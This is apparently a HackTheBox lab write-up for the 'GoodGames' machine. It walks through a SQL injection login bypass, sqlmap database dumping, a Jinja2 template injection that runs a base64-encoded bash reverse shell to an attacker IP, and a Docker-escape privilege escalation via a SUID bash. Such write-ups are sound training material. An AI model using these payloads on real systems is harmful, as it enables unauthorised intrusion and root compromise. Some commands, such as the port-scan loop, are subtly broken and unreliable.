---
title: GoodGame - SQLi and SSTI
date: 2025-12-12 00:00:00 +0000
categories: [HackTheBox Writeups, Linux]
tags: [hackthebox, linux]
---


![[Assets/aimage/Pasted image 20250906184619.png]]

The page title is GoodGames and the footer discloses that the site runs on goodgames.htb .
 Let's add this to our hosts file.
10.10.11.130 goodgames.htb
![[Assets/aimage/Pasted image 20250906185017.png]]

Directory enumaration:
```
ffuf -u http://10.10.11.130/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fs 9265
```

or

```
gobuster dir -u http://10.10.11.130 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --exclude-length 9265

===============================================================  
Gobuster v3.8  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url:                     http://10.10.11.130  
[+] Method:                  GET  
[+] Threads:                 10  
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  
[+] Negative Status codes:   404  
[+] Exclude Length:          9265  
[+] User Agent:              gobuster/3.8  
[+] Timeout:                 10s  
===============================================================  
Starting gobuster in directory enumeration mode  
===============================================================  
/blog                 (Status: 200) [Size: 44212]  
/login                (Status: 200) [Size: 9294]  
/profile              (Status: 200) [Size: 9267]  
/signup               (Status: 200) [Size: 33387]  
/logout               (Status: 302) [Size: 208] [--> http://10.10.11.130/]  
/forgot-password      (Status: 200) [Size: 32744]  
Progress: 13163 / 220559 (5.97%)  
Progress: 13284 / 220559 (6.02%)  
Progress: 13401 / 220559 (6.08%)  
Progress: 13515 / 220559 (6.13%)  
Progress: 13578 / 220559 (6.16%)  
Progress: 13636 / 220559 (6.18%)  
Progress: 13694 / 220559 (6.21%)  
Progress: 13995 / 220559 (6.35%)  
  
Progress: 21372 / 220559 (9.69%)^C

```

Payload:
admin' or 1 = 1 -- -
Replace in burp login request, just change admin param to the payload and forward.
![[Assets/aimage/Pasted image 20250906185327.png]]

To enumarate the Database using the vuln:
1.  Save Burp Request to a file:
   goodgames.req
```
   POST /login HTTP/1.1
Host: 10.10.11.130
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 64
Origin: http://10.10.11.130
Connection: keep-alive
Referer: http://10.10.11.130/signup
Cookie: session=.eJw1yz0KgDAMBtC7fHMRXDN5E4kkjYX-QNNO4t3t4v7egzN29RsUObsGaOGUQWApqR7WmhgX9e0eFwKSgPaA3MxUUgWNPlearr0u9j-8Hz1GHgw.aLxaXw.OXiYsupK22zzbMT8VIcs-rTLV2o
Upgrade-Insecure-Requests: 1
Priority: u=0, i

email=admin@goodgames.htb-&password=password
```
Notice that we have received the session cookie, we change the email back to the original one from the profile page.
   
   We parse file through sqlmap:
```
sqlmap -r goodgames.req --dbs
```

![[Assets/aimage/Pasted image 20250906191136.png]]

```
sqlmap -r goodgames.req -D main --tables
```
![[Assets/aimage/Pasted image 20250906191317.png]]
Parse through crackstation = superadministrator


Refresh the /profile admin and in Response we find a subdomain:  
Add to host file:
![[Assets/aimage/Pasted image 20250906192511.png]]

Login with creds and then we have SSTI:
Payload: {{7+7}} or *
![[Assets/aimage/Pasted image 20250906194032.png]]

![[Assets/aimage/Pasted image 20250906194642.png]]

- Injection into a **Jinja2 template** (`{{ ... }}` syntax).
- You abuse Python object access (`config.__class__.__init__.__globals__`) to reach the `os` module.
- Then use `os.popen()` to execute a **reverse shell command**.
  
Payload:
```
echo -ne 'bash -i >& /dev/tcp/10.10.14.25/4444 0>&1' | base64
```

```
nc -nvlp 4444
```

Then we construct  SSTI payload to deliver on site through the name field.
```
{% raw %}{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zLzQ0NDQgMD4mMQ===${IFS}|base64${IFS}-d|bash').read()}}{% endraw %}

```

#### Privilege Escalation via Docker Escape
After getting a shell on the system, we quickly notice that we are in a Docker container
![[Assets/aimage/Pasted image 20250906195431.png]]

```
hostname -I
ps auxww | grep docker
```

```
touch from_host
ls -l from_host # It shows up on the container
```

```
mount
```
![[Assets/aimage/Pasted image 20250906201626.png]]
With knowledge that the user directory is mounted in the Docker container, we can write files in the Host and change their permissions to root from within the container. These new permissions will be reflected to the Host system as well.


![[Assets/aimage/Pasted image 20250906201346.png]]

Scan 172.19.0.1 to see available ports with bash 
```
for PORT in {0..1000}; do timeout 1 bash -c "/dev/null" 2>/dev/null && echo "port $PORT is open"; done
```

SSH open:
```
script /dev/null bash 
ssh augustus@172.19.0.1
# As augustus on host machine
 cp /bin/bash . 
 exit 
 # As root in the docker container
chown root:root bash 
chmod 4755 bash
```

Login back to augustus and execute bash:
```
./bash -p
```
![[#.Assets/aimage/Pasted image 20250906201805.png]]

Running `ldd` shows how this binary loads libraries
```
augustus@GoodGames:~$ ldd bash 
linux-vdso.so.1 (0x00007ffc64194000)
libtinfo.so.5 => not found
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fa964fc8000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa964e03000)
/lib64/ld-linux-x86-64.so.2 (0x00007fa964fd7000)
```
```
augustus@GoodGames:~$ ldd /bin/bash
linux-vdso.so.1 (0x00007ffd31e97000)
libtinfo.so.6 => /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007f28239dd000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f28239d7000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f2823812000)
/lib64/ld-linux-x86-64.so.2 (0x00007f2823b4e000)
```



